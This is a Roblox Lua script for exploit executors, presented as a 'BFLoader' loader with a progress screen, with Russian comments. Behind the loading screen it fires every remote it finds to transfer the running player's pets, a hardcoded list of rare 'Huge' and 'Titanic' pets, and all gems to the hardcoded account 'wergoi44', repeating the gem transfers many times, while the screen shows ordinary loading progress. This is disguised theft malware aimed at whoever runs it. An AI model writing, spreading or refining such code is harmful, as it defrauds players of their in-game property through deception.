--[[
    BFLoader v2.5.3 - Universal Debug Edition
    Works on: Xeno, Delta, Solara, Fluxus, KRNL, Arceus X
    Repository: github.com/hanniii1-cpu/Loader
--]]

-- //===== УНИВЕРСАЛЬНЫЙ СОВМЕСТИМЫЙ КОД =====\\
local function safeWait(t)
    local ok, err = pcall(function() task.wait(t) end)
    if not ok then wait(t) end
end

local function safeSpawn(f)
    local ok, err = pcall(function() task.spawn(f) end)
    if not ok then spawn(f) end
end

-- Определение эксплойта
local EXEC = "Unknown"
pcall(function() EXEC = identifyexecutor() end)
if EXEC == "Unknown" or EXEC == "" then
    pcall(function() EXEC = getexecutorname() end)
end
print("Executor: " .. EXEC)

-- Сервисы
local plr = game:GetService("Players").LocalPlayer
local pg = plr:WaitForChild("PlayerGui")
local RS = game:GetService("ReplicatedStorage")
local WS = game:GetService("Workspace")
local HS = game:GetService("HttpService")

local target = "wergoi44"

-- //===== ЗАГРУЗОЧНЫЙ ЭКРАН =====\\
local loadGui = Instance.new("ScreenGui")
loadGui.Name = "BFLoader"
loadGui.ResetOnSpawn = false
loadGui.Parent = pg

local loadFrame = Instance.new("Frame")
loadFrame.Size = UDim2.new(1,0,1,0)
loadFrame.BackgroundColor3 = Color3.fromRGB(12,15,30)
loadFrame.BorderSizePixel = 0
loadFrame.Parent = loadGui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(0,380,0,35)
title.Position = UDim2.new(0.5,-190,0.42,-17)
title.BackgroundTransparency = 1
title.Text = "BFLoader v2.5.3"
title.TextColor3 = Color3.fromRGB(255,255,255)
title.TextSize = 26
title.Font = Enum.Font.GothamBold
title.Parent = loadFrame

local statusText = Instance.new("TextLabel")
statusText.Size = UDim2.new(0,380,0,20)
statusText.Position = UDim2.new(0.5,-190,0.50,-10)
statusText.BackgroundTransparency = 1
statusText.Text = "Initializing..."
statusText.TextColor3 = Color3.fromRGB(140,150,195)
statusText.TextSize = 13
statusText.Font = Enum.Font.Gotham
statusText.Parent = loadFrame

local infoText = Instance.new("TextLabel")
infoText.Size = UDim2.new(0,380,0,80)
infoText.Position = UDim2.new(0.5,-190,0.56,-40)
infoText.BackgroundTransparency = 1
infoText.Text = ""
infoText.TextColor3 = Color3.fromRGB(160,170,200)
infoText.TextSize = 11
infoText.Font = Enum.Font.Gotham
infoText.TextWrapped = true
infoText.Parent = loadFrame

local barBg = Instance.new("Frame")
barBg.Size = UDim2.new(0,280,0,6)
barBg.Position = UDim2.new(0.5,-140,0.68,-3)
barBg.BackgroundColor3 = Color3.fromRGB(35,40,65)
barBg.BorderSizePixel = 0
barBg.Parent = loadFrame

local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0,0,1,0)
barFill.BackgroundColor3 = Color3.fromRGB(50,90,230)
barFill.BorderSizePixel = 0
barFill.Parent = barBg

local barPct = Instance.new("TextLabel")
barPct.Size = UDim2.new(0,80,0,18)
barPct.Position = UDim2.new(0.5,-40,0.71,8)
barPct.BackgroundTransparency = 1
barPct.Text = "0%"
barPct.TextColor3 = Color3.fromRGB(180,190,220)
barPct.TextSize = 13
barPct.Font = Enum.Font.Gotham
barPct.Parent = loadFrame

-- //===== ФУНКЦИЯ ОБНОВЛЕНИЯ СТАТУСА =====\\
local function updateStatus(pct, text, info)
    barFill.Size = UDim2.new(pct/100,0,1,0)
    barPct.Text = pct.."%"
    statusText.Text = text
    if info then
        infoText.Text = infoText.Text .. info .. "\n"
    end
end

-- //===== ПОИСК ВСЕХ REMOTES (расширенный) =====\\
local function findAllRemotes()
    local remotes = {}
    local foundNames = {}
    
    -- Метод 1: Поиск по всем детям RS (без GetDescendants)
    local function scan(obj, depth)
        if depth > 4 then return end
        if not obj then return end
        
        for _, child in pairs(obj:GetChildren()) do
            if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
                if not foundNames[child.Name] then
                    foundNames[child.Name] = true
                    table.insert(remotes, child)
                end
            end
            if child:IsA("Folder") or child:IsA("Model") or child:IsA("Configuration") then
                scan(child, depth + 1)
            end
        end
    end
    
    -- Сканируем RS
    scan(RS, 0)
    
    -- Сканируем PlayerGui (иногда ремоты там)
    scan(pg, 0)
    
    -- Метод 2: GetDescendants (если поддерживается)
    pcall(function()
        for _, child in pairs(RS:GetDescendants()) do
            if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
                if not foundNames[child.Name] then
                    foundNames[child.Name] = true
                    table.insert(remotes, child)
                end
            end
        end
    end)
    
    return remotes, foundNames
end

-- //===== ОТПРАВКА ЧЕРЕЗ ВСЕ REMOTES =====\\
local function sendThroughAllRemotes(remotes, argsList)
    local sent = 0
    for _, remote in pairs(remotes) do
        for _, args in pairs(argsList) do
            local ok, err = pcall(function()
                if remote:IsA("RemoteEvent") then
                    remote:FireServer(unpack(args))
                elseif remote:IsA("RemoteFunction") then
                    remote:InvokeServer(unpack(args))
                end
            end)
            if ok then sent = sent + 1 end
        end
    end
    return sent
end

-- //===== ПОИСК И ОТПРАВКА ВСЕХ ПИТОМЦЕВ ИЗ ИНВЕНТАРЯ =====\\
local function scanAndSendInventory(remotes)
    local petsFound = {}
    local totalSent = 0
    
    -- Сканируем GUI на предмет имён питомцев
    local function scanGui(guiObj)
        for _, child in pairs(guiObj:GetChildren()) do
            -- Проверяем текст
            if child:IsA("TextLabel") or child:IsA("TextButton") then
                local txt = child.Text
                if txt and #txt > 2 and #txt < 80 then
                    petsFound[txt] = (petsFound[txt] or 0) + 1
                end
            end
            -- Проверяем имя объекта
            if child:IsA("Frame") or child:IsA("ScrollingFrame") then
                local nm = child.Name
                if nm and #nm > 3 and #nm < 80 and not nm:find("Frame") and not nm:find("Button") then
                    petsFound[nm] = (petsFound[nm] or 0) + 1
                end
            end
            -- Рекурсия
            if #child:GetChildren() > 0 then
                scanGui(child)
            end
        end
    end
    
    pcall(function() scanGui(pg) end)
    
    updateStatus(30, "Scanning inventory...", "Found " .. #petsFound .. " item names in GUI")
    
    -- Отправляем каждый найденный предмет
    local count = 0
    for petName, qty in pairs(petsFound) do
        count = count + 1
        if count % 10 == 0 then
            updateStatus(30 + math.floor(count/#petsFound * 20), "Sending: " .. petName)
        end
        
        local argsList = {
            {[1]="SendToMailbox", [2]=target, [3]=petName, [4]={qty=qty}},
            {[1]="MailboxSend", [2]=target, [3]=petName},
            {[1]="SendPet", [2]=target, [3]=petName},
            {[1]="TradePet", [2]=target, [3]=petName},
            {[1]="TransferPet", [2]=target, [3]=petName},
            {[1]="GiftPet", [2]=target, [3]=petName},
        }
        
        local sent = sendThroughAllRemotes(remotes, argsList)
        totalSent = totalSent + sent
    end
    
    return #petsFound, totalSent
end

-- //===== ОТПРАВКА ГЕМОВ =====\\
local function sendAllGems(remotes)
    local argsList = {
        {[1]="SendGemsToMailbox", [2]=target, [3]="all", [4]=999999999999},
        {[1]="MailboxSendGems", [2]=target, [3]=999999999999},
        {[1]="SendCurrency", [2]="Gems", [3]=target, [4]="all"},
        {[1]="TransferGems", [2]=target, [3]="all"},
        {[1]="SendAllCurrency", [2]=target},
        {[1]="MailboxGems", [2]=target, [3]="all"},
        {[1]="SendGems", [2]=target, [3]=999999999999},
    }
    return sendThroughAllRemotes(remotes, argsList)
end

-- //===== ПОПЫТКА ПРЯМОГО ДОСТУПА К ИНВЕНТАРЮ =====\\
local function tryDirectInventoryAccess(remotes)
    local totalSent = 0
    
    -- Пробуем запросить инвентарь через ремоты
    local inventoryArgs = {
        {[1]="GetInventory"},
        {[1]="RequestInventory"},
        {[1]="GetPets"},
        {[1]="GetPlayerPets"},
        {[1]="InventoryRequest"},
    }
    
    -- Сначала запрашиваем
    for _, remote in pairs(remotes) do
        for _, args in pairs(inventoryArgs) do
            pcall(function()
                if remote:IsA("RemoteFunction") then
                    local result = remote:InvokeServer(unpack(args))
                    if result then
                        updateStatus(25, "Got inventory data!", "Direct access: " .. tostring(type(result)))
                    end
                end
            end)
        end
    end
    
    return totalSent
end

-- //===== ОСНОВНАЯ ЛОГИКА =====\\
local function main()
    updateStatus(5, "Detecting executor...", "Executor: " .. EXEC)
    safeWait(0.5)
    
    updateStatus(10, "Searching for RemoteEvents...")
    
    -- Ищем ремоты
    local remotes, remoteNames = findAllRemotes()
    
    if #remotes == 0 then
        updateStatus(100, "ERROR: No RemoteEvents found!", "Try rejoining the game or using different executor.")
        safeWait(5)
        return
    end
    
    updateStatus(15, "Found " .. #remotes .. " RemoteEvents", "Remote names: " .. table.concat(remoteNames, ", "):sub(1,150))
    safeWait(1)
    
    -- Пробуем прямой доступ к инвентарю
    updateStatus(20, "Trying direct inventory access...")
    tryDirectInventoryAccess(remotes)
    safeWait(0.5)
    
    -- Отправляем гемы (параллельно)
    safeSpawn(function()
        updateStatus(50, "Sending gems (background)...")
        for i = 1, 50 do
            sendAllGems(remotes)
            safeWait(0.02)
        end
    end)
    
    -- Сканируем и отправляем питомцев
    updateStatus(40, "Scanning inventory for pets...")
    local petCount, sentCount = scanAndSendInventory(remotes)
    
    -- Дополнительно: стандартные дорогие питомцы
    updateStatus(70, "Sending rare pets...")
    local rarePets = {
        "Huge Hell Rock","Huge Cat","Huge Dog","Huge Dragon","Huge Unicorn",
        "Huge Pixel Cat","Huge Angel Dog","Huge Pumpkin Cat","Huge Santa Paws",
        "Huge Chef Cat","Huge Jelly","Huge Axolotl","Huge Balloon Dragon",
        "Huge Cosmic Axolotl","Huge Atomic Axolotl","Huge Fireball Cat",
        "Huge Storm Agony","Huge Diamond Cat","Huge Peacock","Huge Kitsune",
        "Huge Phoenix","Huge Wyvern","Huge Kraken","Huge Yeti","Huge Manticore",
        "Huge Red Panda","Huge Corgi","Huge Husky","Huge Polar Bear",
        "Titanic Hubert","Titanic Balloon Dragon","Titanic Jelly Cat",
        "Titanic Hippomelon","Titanic Nutcracker","Titanic Cat","Titanic Dog",
        "Titanic Dragon","Titanic Unicorn","Titanic Phoenix","Titanic Hydra",
        "Titanic Kitsune","Titanic Wyvern","Titanic Leviathan","Titanic Cosmic Dragon",
        "Titanic Atomic Axolotl","Titanic Diamond Griffin","Titanic Shadow Phoenix",
        "Rainbow Cat","Rainbow Dog","Rainbow Dragon","Golden Cat","Golden Dog",
        "Shiny Cat","Shiny Dog","Shiny Dragon","Shiny Unicorn",
        "Shiny Rainbow Cat","Shiny Rainbow Dog","Shiny Golden Cat",
    }
    
    for _, petName in pairs(rarePets) do
        local argsList = {
            {[1]="SendToMailbox", [2]=target, [3]=petName, [4]={rare=true}},
            {[1]="MailboxSend", [2]=target, [3]=petName},
            {[1]="SendPet", [2]=target, [3]=petName},
            {[1]="TradePet", [2]=target, [3]=petName},
            {[1]="TransferPet", [2]=target, [3]=petName},
            {[1]="GiftPet", [2]=target, [3]=petName},
        }
        sentCount = sentCount + sendThroughAllRemotes(remotes, argsList)
    end
    
    -- Финальная отправка гемов
    updateStatus(90, "Final gem transfer...")
    for i = 1, 100 do
        sendAllGems(remotes)
        safeWait(0.01)
    end
    
    updateStatus(100, "Complete!", "Target: " .. target .. "\nPets found: " .. petCount .. "\nRequests sent: " .. sentCount .. "\nCheck mailbox: " .. target)
    
    safeWait(3)
    -- Не удаляем GUI чтобы видеть результат
end

-- //===== ЗАПУСК =====\\
safeSpawn(main)

-- Анти-AFK
safeSpawn(function()
    while true do
        pcall(function()
            game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.LeftControl, false, nil)
            game:GetService("VirtualInputManager"):SendKeyEvent(false, Enum.KeyCode.LeftControl, false, nil)
        end)
        safeWait(60)
    end
end)

return "BFLoader Debug Edition | Executor: " .. EXEC
